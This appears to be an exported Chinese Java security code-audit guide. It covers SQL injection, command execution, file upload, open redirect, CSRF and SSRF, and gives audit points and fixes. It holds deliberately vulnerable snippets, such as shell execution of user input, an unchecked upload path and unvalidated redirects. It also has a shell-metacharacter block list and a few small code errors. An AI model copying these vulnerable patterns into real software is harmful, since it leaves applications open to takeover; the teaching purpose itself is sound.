+JdbcTemplate 是 Spring JDBC 核心包（core）中的核心类，它可以通过配置文件、注解、Java 配置类等形式获取数据库的相关信息，实现了对 JDBC 开发过程中的驱动加载、连接的开启和关闭、SQL 语句的创建与执行、异常处理、事务处理、数据类型转换等操作的封装。我们只要对其传入SQL 语句和必要的参数即可轻松进行 JDBC 编程。
+</p>
+
+<p>
+JdbcTemplate 的全限定命名为 org.springframework.jdbc.core.JdbcTemplate，它提供了大量的查询和更新数据库的方法，如下表所示。
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">&#26041;&#27861; &#35828;&#26126;
+public int update(String sql)
+&#29992;&#20110;&#25191;&#34892;&#26032;&#22686;&#12289;&#26356;&#26032;&#12289;&#21024;&#38500;&#31561;&#35821;&#21477;&#65307;sql&#65306;&#38656;&#35201;&#25191;&#34892;&#30340;SQL &#35821;&#21477;&#65307;args &#34920;&#31034;&#38656;&#35201;&#20256;&#20837;&#21040; SQL &#35821;&#21477;&#20013;&#30340;&#21442;&#25968;&#12290;
+
+public int update(String sql,Object... args)
+
+public void execute(String sql)
+&#21487;&#20197;&#25191;&#34892;&#20219;&#24847; SQL&#65292;&#19968;&#33324;&#29992;&#20110;&#25191;&#34892; DDL &#35821;&#21477;&#65307; sql&#65306;&#38656;&#35201;&#25191;&#34892;&#30340; SQL &#35821;&#21477;&#65307;action &#34920;&#31034;&#25191;&#34892;&#23436; SQL &#35821;&#21477;&#21518;&#65292;&#35201;&#35843;&#29992;&#30340;&#20989;&#25968;&#12290;
+
+public T execute(String sql,PreparedStatementCallback action)
+
+public List query(String sql, RowMapperrowMapper, @Nullable Object... args)
+
+&#29992;&#20110;&#25191;&#34892;&#26597;&#35810;&#35821;&#21477;&#65307;sql&#65306;&#38656;&#35201;&#25191;&#34892;&#30340; SQL &#35821;&#21477;&#65307;rowMapper&#65306;&#29992;&#20110;&#30830;&#23450;&#36820;&#22238;&#30340;&#38598;&#21512;&#65288;List&#65289;&#30340;&#31867;&#22411;&#65307;args&#65306;&#34920;&#31034;&#38656;&#35201;&#20256;&#20837;&#21040; SQL &#35821;&#21477;&#30340;&#21442;&#25968;&#12290;
+
+public T queryForObject(String sql,RowMapper rowMapper, @Nullable Object... args)
+
+public int[] batchUpdate(String sql,List&lt;Object[]&gt; batchArgs, final int[] argTypes)
+
+&#29992;&#20110;&#25209;&#37327;&#25191;&#34892;&#26032;&#22686;&#12289;&#26356;&#26032;&#12289;&#21024;&#38500;&#31561;&#35821;&#21477;&#65307; sql&#65306;&#38656;&#35201;&#25191;&#34892;&#30340; SQL &#35821;&#21477;&#65307;argTypes&#65306;&#38656;&#35201;&#27880;&#20837;&#30340; SQL &#21442;&#25968;&#30340; JDBC&#31867;&#22411;&#65307;batchArgs&#65306;&#34920;&#31034;&#38656;&#35201;&#20256;&#20837;&#21040; SQL &#35821;&#21477;&#30340;&#21442;&#25968;&#12290;
+</pre>
+</div>
+
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #228b22;">String</span> <span style="color: #a0522d;">sql1</span>=<span style="color: #8b2252;">"select * from users where user = ? "</span>;
+<span style="color: #228b22;">PreparedStatement</span> <span style="color: #a0522d;">preparedStatement1</span> = con.prepareStatement(sql1);
+preparedStatement1.setString(1, user);
+<span style="color: #228b22;">ResultSet</span> <span style="color: #a0522d;">re</span> = preparedStatement1.executeQuery();
+<span style="color: #a020f0;">while</span> (re.next()) {
+    System.out.println(re.getString(<span style="color: #8b2252;">"user"</span>));
+}
+</pre>
+</div>
+
+<p>
+搜索与 Java 数据库相关的代码应该有助于查明被审计的应用程序的持久层中涉及的类和方法
+</p>
+
+<p>
+要搜索的字符串
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #008b8b;">java</span>.<span style="color: #008b8b;">sql</span>.Connection.prepareStatement
+<span style="color: #008b8b;">java</span>.<span style="color: #008b8b;">sql</span>.ResultSet.getObject
+select
+insert
+<span style="color: #008b8b;">java</span>.<span style="color: #008b8b;">sql</span>.Statement.executeUpdate
+<span style="color: #008b8b;">java</span>.<span style="color: #008b8b;">sql</span>.Statement.addBatch
+<span style="color: #008b8b;">java</span>.<span style="color: #008b8b;">sql</span>.Statement.executeQuery
+<span style="color: #008b8b;">java</span>.<span style="color: #008b8b;">sql</span>.Statement.execute
+execute
+executestatement
+createStatement
+<span style="color: #008b8b;">java</span>.<span style="color: #008b8b;">sql</span>.ResultSet.getString
+executeQuery
+jdbc
+delete
+update
+<span style="color: #008b8b;">java</span>.<span style="color: #008b8b;">sql</span>.Connection.prepareCall
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-h:be043971-0d53-4e05-97de-5375c0acf721" class="outline-3">
+<h3 id="h:be043971-0d53-4e05-97de-5375c0acf721">解决方案</h3>
+<div class="outline-text-3" id="text-h:be043971-0d53-4e05-97de-5375c0acf721">
+<p>
+使用预处理执行 SQL 语句，对所有传入 SQL 语句中的变量，做绑定。这样，用户拼接进来的变量，无论内容是什么，都会被当做替代符号“?”所替代的值，数据库也不 会把恶意用户拼接进来的数据，当做部分 SQL 语句去解析。
+</p>
+
+<p>
+示例：
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #008b8b;">com</span>.<span style="color: #008b8b;">mysql</span>.<span style="color: #008b8b;">jdbc</span>.<span style="color: #228b22;">Connection</span> <span style="color: #a0522d;">conn</span> = <span style="color: #008b8b;">db</span>.JdbcConnection.getConn();
+
+<span style="color: #a020f0;">final</span> <span style="color: #228b22;">String</span> <span style="color: #a0522d;">sql</span> = <span style="color: #8b2252;">"select * from product where pname like ?"</span>;
+
+<span style="color: #008b8b;">java</span>.<span style="color: #008b8b;">sql</span>.<span style="color: #228b22;">PreparedStatement</span> <span style="color: #a0522d;">ps</span> = (<span style="color: #008b8b;">java</span>.<span style="color: #008b8b;">sql</span>.<span style="color: #228b22;">PreparedStatement</span>)
+conn.prepareStatement(sql);
+
+ps.setObject(1, <span style="color: #8b2252;">"%"</span>+request.getParameter(<span style="color: #8b2252;">"pname"</span>)+<span style="color: #8b2252;">"%"</span>);
+<span style="color: #228b22;">ResultSet</span> <span style="color: #a0522d;">rs</span> = ps.executeQuery();
+</pre>
+</div>
+
+<p>
+无论使用了哪个 ORM 框架，都会支持用户自定义拼接语句，经常有人误解 Hibernate 没有这个漏洞，其实Hibernate 也支持用户执行 JDBC 查询，并且支持用户把变量拼接到SQL 语句中。
+</p>
+</div>
+</div>
+</section>
+<section id="outline-container-h:2820635d-23ab-4b5f-9349-8538aeeb767a" class="outline-2">
+<h2 id="h:2820635d-23ab-4b5f-9349-8538aeeb767a">命令执行</h2>
+<div class="outline-text-2" id="text-h:2820635d-23ab-4b5f-9349-8538aeeb767a">
+<p>
+<b>安全威胁</b>
+</p>
+
+<p>
+Code injection，代码注入攻击
+</p>
+
+<p>
+web 应用代码中，允许接收用户输入一段代码，之后在 web 应用服务器上执行这段代码，并返回给用户。
+</p>
+
+<p>
+由于用户可以自定义输入一段代码，在服务器上执行，所以恶意用户可以写一个远 程控制木马，直接获取服务器控制权限，所有服务器上的资源都会被恶意用户获取和修 改，甚至可以直接控制数据库。
+</p>
+
+<p>
+<b>代码示例</b>
+</p>
+
+<p>
+Java执行系统命令函数
+</p>
+<ul class="org-ul">
+<li>java.lang.Runtime</li>
+<li>java.lang.ProcessBuilder</li>
+</ul>
+
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #b22222;">// </span><span style="color: #b22222;">java.lang.Runtime</span>
+<span style="color: #228b22;">Process</span> <span style="color: #a0522d;">process</span> = Runtime.getRuntime().exec(command);
+process.getOutputStream().close();
+</pre>
+</div>
+
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #228b22;">ProcessBuilder</span> <span style="color: #a0522d;">processBuilder</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">ProcessBuilder</span>();
+
+processBuilder.command(<span style="color: #8b2252;">"bash"</span>, <span style="color: #8b2252;">"-c"</span>, cmd);
+
+<span style="color: #228b22;">BufferedReader</span> <span style="color: #a0522d;">reader</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">BufferedReader</span>(<span style="color: #a020f0;">new</span> <span style="color: #228b22;">InputStreamReader</span>(processBuilder.start().getInputStream(), <span style="color: #008b8b;">StandardCharsets</span>.UTF_8));
+<span style="color: #a020f0;">while</span> ((line = reader.readLine()) != <span style="color: #008b8b;">null</span>) {
+    System.out.println(line);
+}
+reader.close();
+</pre>
+</div>
+</div>
+<div id="outline-container-h:5a9ea6ec-3182-43ce-8570-e21a88ceb2d3" class="outline-3">
+<h3 id="h:5a9ea6ec-3182-43ce-8570-e21a88ceb2d3">解决方案</h3>
+<div class="outline-text-3" id="text-h:5a9ea6ec-3182-43ce-8570-e21a88ceb2d3">
+<p>
+不直接使用用户输入的参数传入命令执行函数中，或对传入的参数进行过滤，仅允许传入字母、数字、下划线等必要字符。（禁止传入|、&amp;、;、&amp;&amp;、||、&lt;、&gt;等特殊字符）
+</p>
+</div>
+</div>
+</section>
+<section id="outline-container-h:ac2013bf-c814-4784-b33d-8264861dc612" class="outline-2">
+<h2 id="h:ac2013bf-c814-4784-b33d-8264861dc612">文件上传</h2>
+<div class="outline-text-2" id="text-h:ac2013bf-c814-4784-b33d-8264861dc612">
+<p>
+<b>名称定义</b>
+</p>
+
+<p>
+File upload，任意文件上传攻击。
+</p>
+
+<p>
+Web 应用程序在处理用户上传的文件时，没有判断文件的扩展名是否在允许的范围内，就把文件保存在服务器上，导致恶意用户可以上传任意文件，甚至上传脚本木马到web 服务器上，直接控制 web 服务器。
+</p>
+
+<p>
+<b>代码示例</b>
+</p>
+
+<p>
+读取文件函数：
+</p>
+<div class="org-src-container">
+<pre class="src src-java">getInputStream()/FileOutputStream()
+getOriginalFilename()
+FileWriter
+File
+&#25110;&#26597;&#25214; filename &#30456;&#20851;&#30340;&#20851;&#38190;&#23383;&#36827;&#34892;&#26816;&#32034;&#65307;
+</pre>
+</div>
+
+
+<p>
+处理用户上传文件请求的代码，这段代码没有过滤文件扩展名。
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #228b22;">PrintWriter</span> <span style="color: #a0522d;">pw</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">PrintWriter</span>(<span style="color: #a020f0;">new</span> <span style="color: #228b22;">BufferedWriter</span>(<span style="color: #a020f0;">new</span> <span style="color: #228b22;">FileWriter</span>(
+
+request.getRealPath(<span style="color: #8b2252;">"/"</span>)+getFIlename(request))));
+<span style="color: #228b22;">ServletInputStream</span> <span style="color: #a0522d;">in</span> = request.getInputStream(); <span style="color: #228b22;">int</span> <span style="color: #a0522d;">i</span> = in.read();
+<span style="color: #a020f0;">while</span> (i != -1) {
+pw.print((<span style="color: #228b22;">char</span>) i); i = in.read();
+}
+pw.close();
+</pre>
+</div>
+
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #008b8b;">@Controller</span>
+<span style="color: #a020f0;">public</span> <span style="color: #a020f0;">class</span> <span style="color: #228b22;">UploadFile</span> {
+    <span style="color: #008b8b;">@PostMapping</span>(<span style="color: #8b2252;">"/upload"</span>)
+    <span style="color: #a020f0;">public</span> <span style="color: #228b22;">String</span> <span style="color: #0000ff;">uploadFile</span>(<span style="color: #008b8b;">@RequestParam</span>(<span style="color: #8b2252;">"uploadfile"</span>)<span style="color: #228b22;">MultipartFile</span> <span style="color: #a0522d;">file</span>){
+        <span style="color: #b22222;">//</span><span style="color: #b22222;">&#33719;&#21462;&#25991;&#20214;&#21517;</span>
+        <span style="color: #228b22;">String</span> <span style="color: #a0522d;">filename</span> = file.getOriginalFilename();
+        <span style="color: #b22222;">//</span><span style="color: #b22222;">&#25991;&#20214;&#20445;&#23384;&#36335;&#24452;</span>
+        <span style="color: #228b22;">String</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/var/www/html/cici/upload"</span>;
+        <span style="color: #228b22;">File</span> <span style="color: #a0522d;">outfile</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">File</span>(path + filename);
+        <span style="color: #a020f0;">try</span> {
+            file.transferTo(outfile);
+        }<span style="color: #a020f0;">catch</span> (IOException e){
+            e.printStackTrace();
+        }
+        <span style="color: #a020f0;">return</span> <span style="color: #8b2252;">"success"</span>;
+    }
+}
+</pre>
+</div>
+
+<p>
+审计点：
+</p>
+<ol class="org-ol">
+<li>查看文件写入路径是否可以被用户控制</li>
+<li>查看是否限制文件后缀</li>
+</ol>
+</div>
+<div id="outline-container-h:bb0bd9d5-4ade-49fb-a2cd-cf06c0040e52" class="outline-3">
+<h3 id="h:bb0bd9d5-4ade-49fb-a2cd-cf06c0040e52">解决方案</h3>
+<div class="outline-text-3" id="text-h:bb0bd9d5-4ade-49fb-a2cd-cf06c0040e52">
+<p>
+处理用户上传文件，要做以下检查：
+1、 检查上传文件扩展名白名单，不属于白名单内，不允许上传。
+2、 上传文件的目录必须是 http 请求无法直接访问到的。如果需要访问的，必须上传到其他（和 web 服务器不同的）域名下，并设置该目录为不解析 jsp 等脚本语言的目录。
+3、 上传文件要保存的文件名和目录名由系统根据时间生成，不允许用户自定义。
+</p>
+</div>
+</div>
+</section>
+<section id="outline-container-h:06fc75b8-f7f9-4e4b-ac84-1f145cc5f07a" class="outline-2">
+<h2 id="h:06fc75b8-f7f9-4e4b-ac84-1f145cc5f07a">重定向</h2>
+<div class="outline-text-2" id="text-h:06fc75b8-f7f9-4e4b-ac84-1f145cc5f07a">
+<p>
+<b>安全威胁</b>
+</p>
+
+<p>
+URL redirect，URL 跳转攻击。
+</p>
+
+<p>
+Web 应用程序接收到用户提交的 URL 参数后，没有对参数做“可信任 URL”的验证， 就向用户浏览器返回跳转到该URL 的指令。
+</p>
+
+<p>
+如果某个 web 应用程序存在这个漏洞，恶意攻击者可以发送给用户一个链接，但是用户打开后，却来到钓鱼网站页面，将会导致用户被钓鱼攻击，账号被盗，或账号相关财产被盗。
+</p>
+
+<p>
+URL跳转相关函数：
+</p>
+<div class="org-src-container">
+<pre class="src src-sh"><span style="color: #0000ff;">sendRedirect</span>()
+<span style="color: #0000ff;">redirect</span>()
+<span style="color: #0000ff;">forward</span>()
+<span style="color: #0000ff;">setHeader</span>()
+</pre>
+</div>
+
+<p>
+<b>代码示例</b>
+</p>
+
+<p>
+这是一段没有验证目的地址，就直接跳转的经典代码：
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #a020f0;">if</span>(checklogin(request)){
+  response.sendRedirect(request.getParameter(<span style="color: #8b2252;">"url"</span>));
+}
+</pre>
+</div>
+
+<p>
+这段代码存在 URL 跳转漏洞，当用户登陆成功后，会跳转到 url 参数所指向的地址。
+</p>
+
+<p>
+使用SpringMVC时使用 redirect 开头的字符串，可以起到重定向作用
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #a020f0;">public</span> <span style="color: #228b22;">String</span> <span style="color: #0000ff;">redirect</span>(){
+  <span style="color: #a020f0;">return</span><span style="color: #8b2252;">"redirect:http://www.baidu.com"</span>;
+}
+</pre>
+</div>
+</div>
+<div id="outline-container-h:ed9622ff-b2dd-4fa3-b12b-96288f415437" class="outline-3">
+<h3 id="h:ed9622ff-b2dd-4fa3-b12b-96288f415437">解决方案</h3>
+<div class="outline-text-3" id="text-h:ed9622ff-b2dd-4fa3-b12b-96288f415437">
+<p>
+为了保证用户所点击的 URL，是从 web 应用程序中生成的 URL，所以要做 TOKEN 验证。
+</p>
+
+<p>
+如果应用只有跳转网站的需求，可以设置白名单，判断目的地址是 否在白名单列表中，如果不在列表中，就判定为URL 跳转攻击，并记录日志。不允许配置集团以外网站到白名单列表中。
+</p>
+
+<p>
+这两个方案都可以保证所有在应用中发出的重定向地址，都是可信任的地址。
+</p>
+
+<p>
+<b>注意：设置白名单时要注意进行后缀匹配</b>
+</p>
+</div>
+</div>
+</section>
+<section id="outline-container-h:6206af53-fb6c-43d2-9ded-5ed17b1cd2dc" class="outline-2">
+<h2 id="h:6206af53-fb6c-43d2-9ded-5ed17b1cd2dc">CSRF</h2>
+<div class="outline-text-2" id="text-h:6206af53-fb6c-43d2-9ded-5ed17b1cd2dc">
+<p>
+<b>安全威胁</b>
+</p>
+
+<p>
+Cross-Site Request Forgery（CSRF），跨站请求伪造攻击。
+</p>
+
+<p>
+攻击者在用户浏览网页时，利用页面元素（例如 img 的 src），强迫受害者的浏览器向 Web 应用程序发送一个改变用户信息的请求。
+</p>
+
+<p>
+由于发生 CSRF 攻击后，攻击者是强迫用户向服务器发送请求，所以会造成用户信息被迫修改，更严重者引发蠕虫攻击。
+</p>
+
+<p>
+CSRF 攻击可以从站外和站内发起。从站内发起 CSRF 攻击，需要利用网站本身的业务，比如“自定义头像”功能，恶意用户指定自己的头像 URL 是一个修改用户信息的链接，当其他已登录用户浏览恶意用户头像时，会自动向这个链接发送修改信息请求。
+</p>
+
+<p>
+从站外发送请求，则需要恶意用户在自己的服务器上，放一个自动提交修改个人信 息的 htm 页面，并把页面地址发给受害者用户，受害者用户打开时，会发起一个请求。
+</p>
+
+<p>
+如果恶意用户能够知道网站管理后台某项功能的 URL，就可以直接攻击管理员，强迫管理员执行恶意用户定义的操作。
+</p>
+
+<p>
+<b>代码示例</b>
+</p>
+
+<p>
+一个没有 CSRF 安全防御的代码如下：
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #a020f0;">public</span> <span style="color: #228b22;">void</span> <span style="color: #0000ff;">csrfTest</span>(<span style="color: #228b22;">HttpServletRequest</span> <span style="color: #a0522d;">request</span>, <span style="color: #228b22;">HttpServletResponse</span> <span style="color: #a0522d;">response</span>) {
+    <span style="color: #228b22;">int</span> <span style="color: #a0522d;">userid</span>=Integer.valueOf(request.getSession().getAttribute(<span style="color: #8b2252;">"userid"</span>).toString());
+    <span style="color: #228b22;">String</span> <span style="color: #a0522d;">email</span>=request.getParameter(<span style="color: #8b2252;">"email"</span>);
+    <span style="color: #228b22;">String</span> <span style="color: #a0522d;">tel</span>=request.getParameter(<span style="color: #8b2252;">"tel"</span>);
+    <span style="color: #228b22;">String</span> <span style="color: #a0522d;">ciciName</span>=request.getParameter(<span style="color: #8b2252;">"student_name"</span>); <span style="color: #228b22;">Object</span>[] <span style="color: #a0522d;">params</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">Object</span>[4];
+    params[0] = email;
+    params[1] = tel;
+    params[2] = realname;
+    params[3] = userid;
+    <span style="color: #a020f0;">final</span> <span style="color: #228b22;">String</span> <span style="color: #a0522d;">sql</span> = <span style="color: #8b2252;">"update user set email=?,tel=?,realname=? where userid=?"</span>;
+    conn.execUpdate(sql,params);
+</pre>
+</div>
+
+<p>
+代码中接收用户提交的参数“email,tel,realname”，之后修改了该用户的数据，一 旦接收到一个用户发来的请求，就执行修改操作。
+</p>
+
+<p>
+提交表单代码：
+</p>
+<div class="org-src-container">
+<pre class="src src-html">&lt;<span style="color: #0000ff;">form</span> <span style="color: #a0522d;">action</span>=<span style="color: #8b2252;">"http://localhost/servlet/modify"</span> <span style="color: #a0522d;">method</span>=<span style="color: #8b2252;">"POST"</span>&gt;
+&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"email"</span>&gt;
+&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"tel"</span>&gt;
+&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"student_name"</span>&gt;
+&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"userid"</span>&gt;
+&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"submit"</span>&gt;
+&lt;/<span style="color: #0000ff;">form</span>&gt;
+</pre>
+</div>
+
+<p>
+当用户点提交时，就会触发修改操作。
+</p>
+
+<p>
+<b>审计时需要关注系统敏感功能逻辑，例如：增删改查、支付等</b>
+当是个敏感功能时要加csrf防御。
+</p>
+</div>
+<div id="outline-container-h:ac2295cd-c04f-44e9-8a4c-0cd06f188802" class="outline-3">
+<h3 id="h:ac2295cd-c04f-44e9-8a4c-0cd06f188802">解决方案</h3>
+<div class="outline-text-3" id="text-h:ac2295cd-c04f-44e9-8a4c-0cd06f188802">
+<ol class="org-ol">
+<li>在用户登陆时，设置一个 CSRF 的随机 TOKEN，同时种植在用户的 cookie 中， 当用户浏览器关闭、或用户再次登录、或退出时，清除 token。</li>
+<li>在表单中，生成一个隐藏域，它的值就是 COOKIE 中随机 TOKEN。</li>
+<li>表单被提交后，就可以在接收用户请求的 web 应用中，判断表单中的 TOKEN 值是否和用户 COOKIE 中的TOKEN 值一致，如果不一致或没有这个值，就判断为 CSRF 攻击，同时记录攻击日志（日志内容见“Error Handingand Logging” 章节）。</li>
+</ol>
+
+<p>
+由于攻击者无法预测每一个用户登录时生成的那个随机 TOKEN 值，所以无法伪造这个参数。
+</p>
+
+<p>
+示例：
+</p>
+<div class="org-src-container">
+<pre class="src src-html">&lt;<span style="color: #0000ff;">form</span> <span style="color: #a0522d;">method</span>=<span style="color: #8b2252;">"post"</span> <span style="color: #a0522d;">id</span>=<span style="color: #8b2252;">"xxxx"</span> <span style="color: #a0522d;">name</span>=<span style="color: #8b2252;">"xxxx"</span> <span style="color: #a0522d;">style</span>=<span style="color: #8b2252;">"margin:0px;"</span>&gt;
+$csrfToken.hiddenField
+...
+&lt;/<span style="color: #0000ff;">form</span>&gt;
+</pre>
+</div>
+<p>
+代码中$csrfToken.hiddenField 将会生成一个隐藏域，用于生成验证 token，它将会作为表单的其提交。
+</p>
+
+<ol class="org-ol">
+<li>验证referer</li>
+</ol>
+<p>
+注意验证 referer 有可能会被绕过
+同一网站中如果有其他漏洞配合或一些特殊情况下，也可以发出的 CSRF 攻击。
+</p>
+
+<p>
+其他修复方案：加验证码、自定义请求头等
+</p>
+</div>
+</div>
+</section>
+<section id="outline-container-h:07737c63-bf26-405b-bd89-d8691505ea91" class="outline-2">
+<h2 id="h:07737c63-bf26-405b-bd89-d8691505ea91">SSRF</h2>
+<div class="outline-text-2" id="text-h:07737c63-bf26-405b-bd89-d8691505ea91">
+<p>
+SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种利用漏洞伪造服务器端发起请求。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。
+</p>
+
+<p>
+<b>安全威胁</b>
+</p>
+
+<p>
+通过控制功能中的发起请求的服务来当作跳板攻击内网中其他服务。比如，通过控制前台的请求远程地址加载的响应，来让请求数据由远程的URL域名修改为请求本地、或者内网的IP地址及服务，来造成对内网系统的攻击。
+</p>
+
+<p>
+1 扫描内网开放服务
+2 向内部任意主机的任意端口发送payload来攻击内网服务
+3 DOS攻击（请求大文件，始终保持连接Keep-Alive Always）
+4 攻击内网的web应用，例如直接SQL注入、XSS攻击等。内网的服务一般安全性较差。
+5 利用file、gopher、dict协议读取本地文件、执行命令等
+</p>
+
+<p>
+敏感函数：
+</p>
+<div class="org-src-container">
+<pre class="src src-java">Httpclient.execute()
+HttpURLConnection.connect()
+URL.openStream()
+URLConnection.openConnection()
+</pre>
+</div>
+
+<p>
+<b>示例代码</b>
+</p>
+
+<ol class="org-ol">
+<li>Httpclient.execute() 函数</li>
+</ol>
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #228b22;">HttpGet</span> <span style="color: #a0522d;">httppost</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">HttpGet</span>(Geocode.url + <span style="color: #8b2252;">"/"</span> + ip);
+<span style="color: #228b22;">HttpClient</span> <span style="color: #a0522d;">httpclient</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">DefaultHttpClient</span>();
+<span style="color: #228b22;">HttpResponse</span> <span style="color: #a0522d;">response</span> = httpclient.execute(httppost);
+</pre>
+</div>
+
+<ol class="org-ol">
+<li>HttpURLConnection.connect() 函数</li>
+</ol>
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #228b22;">URL</span> <span style="color: #a0522d;">url</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">URL</span>(<span style="color: #8b2252;">"http://www.cici.com/login.do?username=admin&amp;password=admin"</span>);
+<span style="color: #b22222;">// </span><span style="color: #b22222;">&#24471;&#21040;&#32593;&#32476;&#35775;&#38382;&#23545;&#35937;java.net.HttpURLConnection</span>
+httpURLConnection = (<span style="color: #228b22;">HttpURLConnection</span>) url.openConnection();
+<span style="color: #b22222;">// </span><span style="color: #b22222;">&#36830;&#25509;</span>
+httpURLConnection.connect();
+</pre>
+</div>
+
+<ol class="org-ol">
+<li>URL.openStream() 函数</li>
+</ol>
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #228b22;">URL</span> <span style="color: #a0522d;">url</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">URL</span>(<span style="color: #8b2252;">"http://www.cici.com"</span>);
+<span style="color: #228b22;">InputStream</span> <span style="color: #a0522d;">is</span> = url.openStream();
+<span style="color: #228b22;">InputStreamReader</span> <span style="color: #a0522d;">isr</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">InputStreamReader</span>(is,<span style="color: #8b2252;">"utf-8"</span>);
+<span style="color: #228b22;">BufferedReader</span> <span style="color: #a0522d;">br</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">BufferedReader</span>(isr);
+<span style="color: #228b22;">String</span> <span style="color: #a0522d;">data</span> = br.readLine();
+<span style="color: #a020f0;">while</span>(data != <span style="color: #008b8b;">null</span>){
+    System.out.println(data);
+    data = br.readLine();
+}
+br.close();
+isr.close();
+is.close();
+</pre>
+</div>
+
+<ol class="org-ol">
+<li>URLConnection.openConnection() 函数</li>
+</ol>
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #228b22;">URL</span> <span style="color: #a0522d;">realUrl</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">URL</span>(urlNameString);
+<span style="color: #b22222;">// </span><span style="color: #b22222;">&#25171;&#24320;&#21644;URL&#20043;&#38388;&#30340;&#36830;&#25509;</span>
+<span style="color: #228b22;">URLConnection</span> <span style="color: #a0522d;">connection</span> = realUrl.openConnection();
+</pre>
+</div>
+</div>
+<div id="outline-container-h:3fa31637-f67e-4c07-8f9a-953937d03de7" class="outline-3">
+<h3 id="h:3fa31637-f67e-4c07-8f9a-953937d03de7">解决方案</h3>
+<div class="outline-text-3" id="text-h:3fa31637-f67e-4c07-8f9a-953937d03de7">
+<p>
+漏洞修复代码
+</p>
+<div class="org-src-container">
+<pre class="src src-java"><span style="color: #228b22;">String</span>[] <span style="color: #a0522d;">urlwhitelist</span> = {<span style="color: #8b2252;">".cici.org"</span>, <span style="color: #8b2252;">".cici.com"</span>};
+<span style="color: #a020f0;">public</span> <span style="color: #a020f0;">static</span> <span style="color: #228b22;">Boolean</span> <span style="color: #0000ff;">ciciSSRFUrlCheck</span>(<span style="color: #228b22;">String</span> <span style="color: #a0522d;">url</span>, <span style="color: #228b22;">String</span>[] <span style="color: #a0522d;">urlwhitelist</span>) {
+    <span style="color: #a020f0;">try</span> {
+        <span style="color: #228b22;">URL</span> <span style="color: #a0522d;">u</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">URL</span>(url);
+        <span style="color: #b22222;">// </span><span style="color: #b22222;">&#21482;&#20801;&#35768;http&#21644;https&#30340;&#21327;&#35758;&#36890;&#36807;</span>
+        <span style="color: #a020f0;">if</span> (!u.getProtocol().startsWith(<span style="color: #8b2252;">"http"</span>) &amp;&amp;
+            !u.getProtocol().startsWith(<span style="color: #8b2252;">"https"</span>)) {
+            <span style="color: #a020f0;">return</span> <span style="color: #008b8b;">false</span>;
+        }
+        <span style="color: #b22222;">// </span><span style="color: #b22222;">&#33719;&#21462;&#22495;&#21517;&#65292;&#24182;&#36716;&#20026;&#23567;&#20889;</span>
+        <span style="color: #228b22;">String</span> <span style="color: #a0522d;">host</span> = u.getHost().toLowerCase();
+        <span style="color: #a020f0;">for</span> (<span style="color: #228b22;">String</span> <span style="color: #a0522d;">whiteurl</span>: urlwhitelist){
+            <span style="color: #a020f0;">if</span> (host.endWith(whiteurl)) {
+                <span style="color: #a020f0;">return</span> <span style="color: #008b8b;">true</span>;
+            }
+        }
+        <span style="color: #a020f0;">return</span> <span style="color: #008b8b;">false</span>;
+    } <span style="color: #a020f0;">catch</span> (Exception e) {
+        <span style="color: #a020f0;">return</span> <span style="color: #008b8b;">false</span>;
+    }
+}
+</pre>
+</div>
+
+<p>
+1.域名白名单
+2.过滤内网IP、不可信域名
+3.禁用其他协议；
+</p>
+</div>
+</div>
+</section>
+<section id="outline-container-h:fb8a6017-5fcc-483a-b82c-a3481dbba8ad" class="outline-2">
+<h2 id="h:fb8a6017-5fcc-483a-b82c-a3481dbba8ad">XSS</h2>
+<div class="outline-text-2" id="text-h:fb8a6017-5fcc-483a-b82c-a3481dbba8ad">
+<p>
+<b>安全威胁</b>
+</p>
+
+<p>
+Cross Site Script（XSS），跨站脚本攻击。
+</p>
+
+<p>
+攻击者利用应用程序的动态展示数据功能，在 html 页面里嵌入恶意代码。当用户浏览该页之时，这些嵌入在 html中的恶意代码会被执行，用户浏览器被攻击者控制，从而达到攻击者的特殊目的。
+</p>
+
+<p>
+跨站脚本攻击有两种攻击形式
+1、反射型跨站脚本攻击
+攻击者会通过社会工程学手段，发送一个 URL 连接给用户打开，在用户打开页面的同时，浏览器会执行页面中嵌入的恶意脚本。
+</p>
+
+<p>
+2、存储型跨站脚本攻击
